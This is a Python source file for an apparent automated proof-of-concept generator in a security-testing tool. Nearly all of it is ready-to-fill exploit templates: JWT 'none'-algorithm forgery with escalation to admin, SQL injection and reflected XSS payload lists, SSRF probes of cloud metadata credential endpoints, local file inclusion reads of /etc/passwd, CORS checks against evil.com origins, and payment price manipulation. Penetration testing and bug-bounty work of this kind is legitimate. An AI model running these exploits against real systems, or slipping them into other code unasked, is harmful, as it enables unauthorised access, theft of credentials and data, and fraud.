"""
poc_generator.py — Automatic PoC Generator
Generates working Python PoC scripts per finding
MilkyWay Intelligence | Author: Sharlix
"""
import json
import os
from datetime import datetime
from typing import Dict, Optional


POC_TEMPLATES = {

"IDOR": '''#!/usr/bin/env python3
"""
PoC: Insecure Direct Object Reference (IDOR)
Target:  {endpoint}
Param:   {param}
Method:  {method}
Author:  Sharlix | MilkyWay Intelligence
"""
import requests
requests.packages.urllib3.disable_warnings()

TARGET   = "{endpoint}"
METHOD   = "{method}"
OWN_ID   = "USER_A_ID_HERE"
OTHER_ID = "USER_B_ID_HERE"
TOKEN    = "YOUR_JWT_TOKEN_HERE"

headers  = {{"Authorization": f"Bearer {{TOKEN}}", "Content-Type": "application/json"}}

# Step 1: Request own resource (baseline)
own_resp = requests.request(METHOD, TARGET, params={{"{param}": OWN_ID}},
                             headers=headers, verify=False)
print(f"[*] Own data (status={{own_resp.status_code}}, size={{len(own_resp.content)}})")

# Step 2: Request other user's resource
other_resp = requests.request(METHOD, TARGET, params={{"{param}": OTHER_ID}},
                               headers=headers, verify=False)
print(f"[*] Other user data (status={{other_resp.status_code}}, size={{len(other_resp.content)}})")

if other_resp.status_code == 200 and len(other_resp.content) > 50:
    print("[+] IDOR CONFIRMED: Other user's data returned!")
    print(other_resp.json())
else:
    print("[-] Not exploitable with these params")
''',

"JWT_NONE_ALG": '''#!/usr/bin/env python3
"""
PoC: JWT Algorithm Confusion (none algorithm)
Target:  {endpoint}
Author:  Sharlix | MilkyWay Intelligence
"""
import base64, json, requests
requests.packages.urllib3.disable_warnings()

TARGET     = "{endpoint}"
ORIG_TOKEN = "YOUR_VALID_JWT_HERE"

def b64pad(s):
    return s + "=" * (4 - len(s) % 4)

parts   = ORIG_TOKEN.split(".")
header  = json.loads(base64.urlsafe_b64decode(b64pad(parts[0])))
payload = json.loads(base64.urlsafe_b64decode(b64pad(parts[1])))

# Modify algorithm and escalate role
header["alg"] = "none"
for k in ("role", "roles", "is_admin", "admin", "type"):
    if k in payload:
        payload[k] = "admin"
        print(f"[*] Changed {{k}} → admin")

enc = lambda d: base64.urlsafe_b64encode(
    json.dumps(d, separators=(",",":")).encode()
).rstrip(b"=").decode()

forged = f"{{enc(header)}}.{{enc(payload)}}."
print(f"[*] Forged token: {{forged[:60]}}...")

resp = requests.get(TARGET, headers={{"Authorization": f"Bearer {{forged}}"}}, verify=False)
print(f"[*] Response: {{resp.status_code}} | {{len(resp.content)}} bytes")
if resp.status_code == 200:
    print("[+] JWT NONE ALG BYPASS CONFIRMED!")
    print(resp.text[:500])
''',

"SQLI": '''#!/usr/bin/env python3
"""
PoC: SQL Injection
Target:  {endpoint}
Param:   {param}
Author:  Sharlix | MilkyWay Intelligence
"""
import requests
requests.packages.urllib3.disable_warnings()

TARGET  = "{endpoint}"
PARAM   = "{param}"
METHOD  = "{method}"

PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    '" OR "1"="1',
    "1' AND SLEEP(3)--",
    "1 UNION SELECT NULL,NULL,NULL--",
]

for payload in PAYLOADS:
    params = {{PARAM: payload}}
    resp   = requests.request(METHOD, TARGET, params=params, verify=False)
    body   = resp.text.lower()
    errors = ["sql syntax","mysql_fetch","ora-","sqlite3",
              "pg_query","microsoft sql","syntax error"]
    if any(e in body for e in errors):
        print(f"[+] SQLi CONFIRMED with: {{payload}}")
        print(resp.text[:400])
        break
    elif resp.elapsed.total_seconds() > 3 and "SLEEP" in payload:
        print(f"[+] Time-based SQLi CONFIRMED: delay={{resp.elapsed.total_seconds():.1f}}s")
        break
    print(f"[-] {{payload[:40]}} → {{resp.status_code}}")
''',

"XSS": '''#!/usr/bin/env python3
"""
PoC: Reflected XSS
Target:  {endpoint}
Param:   {param}
Author:  Sharlix | MilkyWay Intelligence
"""
import requests
requests.packages.urllib3.disable_warnings()

TARGET  = "{endpoint}"
PARAM   = "{param}"

PAYLOADS = [
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    "'\"><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
]

for payload in PAYLOADS:
    resp = requests.get(TARGET, params={{PARAM: payload}}, verify=False)
    if payload in resp.text:
        print(f"[+] XSS REFLECTED! Payload: {{payload}}")
        print(f"[*] Proof URL: {{TARGET}}?{{PARAM}}={{requests.utils.quote(payload)}}")
        break
    print(f"[-] {{payload[:40]}} → not reflected")
''',

"SSRF": '''#!/usr/bin/env python3
"""
PoC: Server-Side Request Forgery (SSRF)
Target:  {endpoint}
Param:   {param}
Author:  Sharlix | MilkyWay Intelligence
"""
import requests
requests.packages.urllib3.disable_warnings()

TARGET = "{endpoint}"
PARAM  = "{param}"

PROBES = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.170.2/v2/metadata",
    "http://localhost/",
    "http://127.0.0.1/",
]

for probe in PROBES:
    resp = requests.get(TARGET, params={{PARAM: probe}},
                         headers={{"Metadata": "true"}}, verify=False)
    indicators = ["ami-id","instance-id","security-credentials",
                  "computeMetadata","IAM","role-name","localhost"]
    if any(i in resp.text for i in indicators):
        print(f"[+] SSRF CONFIRMED! → {{probe}}")
        print(resp.text[:600])
        break
    print(f"[-] {{probe[:50]}} → {{resp.status_code}}")
''',

"LFI": '''#!/usr/bin/env python3
"""
PoC: Local File Inclusion (LFI)
Target:  {endpoint}
Param:   {param}
Author:  Sharlix | MilkyWay Intelligence
"""
import requests
requests.packages.urllib3.disable_warnings()

TARGET = "{endpoint}"
PARAM  = "{param}"

PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "....//....//etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "php://filter/read=convert.base64-encode/resource=index.php",
]

for payload in PAYLOADS:
    resp = requests.get(TARGET, params={{PARAM: payload}}, verify=False)
    if "root:" in resp.text or "daemon:" in resp.text:
        print(f"[+] LFI CONFIRMED! Payload: {{payload}}")
        print(resp.text[:600])
        break
    print(f"[-] {{payload[:40]}} → {{resp.status_code}}")
''',

"CORS": '''#!/usr/bin/env python3
"""
PoC: CORS Misconfiguration
Target:  {endpoint}
Author:  Sharlix | MilkyWay Intelligence
"""
import requests
requests.packages.urllib3.disable_warnings()

TARGET  = "{endpoint}"
ORIGINS = ["https://evil.com", "null", "https://attacker.com"]

for origin in ORIGINS:
    resp = requests.get(TARGET,
                         headers={{"Origin": origin, "Cookie": "SESSION=YOUR_SESSION"}},
                         verify=False)
    acao = resp.headers.get("Access-Control-Allow-Origin","")
    acac = resp.headers.get("Access-Control-Allow-Credentials","")
    if acao == origin:
        print(f"[+] CORS CONFIRMED! Origin: {{origin}}")
        print(f"    ACAO: {{acao}}")
        print(f"    ACAC: {{acac}}")
        if acac.lower() == "true":
            print("[CRITICAL] Credentials flag is TRUE — session theft possible!")
        break
''',

"PAYMENT_BYPASS": '''#!/usr/bin/env python3
"""
PoC: Payment Bypass / Price Manipulation
Target:  {endpoint}
Param:   {param}
Author:  Sharlix | MilkyWay Intelligence
"""
import requests
requests.packages.urllib3.disable_warnings()

TARGET = "{endpoint}"
TOKEN  = "YOUR_JWT_TOKEN_HERE"
HDRS   = {{"Authorization": f"Bearer {{TOKEN}}", "Content-Type": "application/json"}}

TESTS = [
    {{"{param}": "0"}},
    {{"{param}": "-1"}},
    {{"{param}": "0.001"}},
    {{"{param}": "-999"}},
]

for body in TESTS:
    resp = requests.post(TARGET, json=body, headers=HDRS, verify=False)
    if resp.status_code in (200, 201):
        try:
            rb = resp.json()
            if any(k in str(rb).lower() for k in ["order","success","confirm"]):
                print(f"[+] PAYMENT BYPASS CONFIRMED! Payload: {{body}}")
                print(resp.text[:400])
                break
        except Exception:
            pass
    print(f"[-] {{body}} → {{resp.status_code}}")
''',

"DEFAULT": '''#!/usr/bin/env python3
"""
PoC: {type}
Target:  {endpoint}
Author:  Sharlix | MilkyWay Intelligence
"""
import requests
requests.packages.urllib3.disable_warnings()

TARGET = "{endpoint}"
PARAM  = "{param}"
METHOD = "{method}"

# Description: {description}

resp = requests.request(METHOD, TARGET,
                         params={{PARAM: "TEST_PAYLOAD"}},
                         verify=False)
print(f"Status:  {{resp.status_code}}")
print(f"Size:    {{len(resp.content)}} bytes")
print(f"Preview: {{resp.text[:300]}}")
'''
}


class PoCGenerator:
    def __init__(self, db, ai_brain, logger, out_dir: str, prefix: str):
        self.db      = db
        self.ai      = ai_brain
        self.log     = logger
        self.out_dir = out_dir
        self.prefix  = prefix
        self.poc_dir = os.path.join(out_dir, f"{prefix}_poc")
        os.makedirs(self.poc_dir, exist_ok=True)

    def generate_all(self):
        findings = self.db.get_findings("verified")
        if not findings:
            findings = self.db.get_all_findings()
        count = 0
        for f in findings:
            path = self.generate(f)
            if path:
                count += 1
                self.db.conn.execute(
                    "UPDATE findings SET poc_file=? WHERE id=?",
                    (path, f["id"])
                )
                self.db.conn.commit()
        if count:
            self.log.success(f"PoC files generated: {count}")

    def generate(self, finding: Dict) -> Optional[str]:
        ftype = finding.get("type", "DEFAULT")
        tmpl  = POC_TEMPLATES.get(ftype, POC_TEMPLATES["DEFAULT"])

        code = tmpl.format(
            endpoint    = finding.get("endpoint", "http://target/"),
            param       = finding.get("param", "id"),
            method      = finding.get("method", "GET"),
            type        = ftype,
            description = finding.get("description", "")[:100]
        )

        # Try AI-enhanced PoC
        if self.ai and hasattr(self.ai, "generate_poc"):
            ai_code = self.ai.generate_poc(finding)
            if ai_code and len(ai_code) > 100:
                code = ai_code

        fname = (f"finding_{finding.get('id','0'):03}_"
                 f"{ftype}_{finding.get('param','x')[:10]}.py"
                 if isinstance(finding.get("id"), int)
                 else f"finding_{ftype}.py")
        path  = os.path.join(self.poc_dir, fname)

        try:
            with open(path, "w") as f_out:
                f_out.write(code)
            return path
        except Exception:
            return None
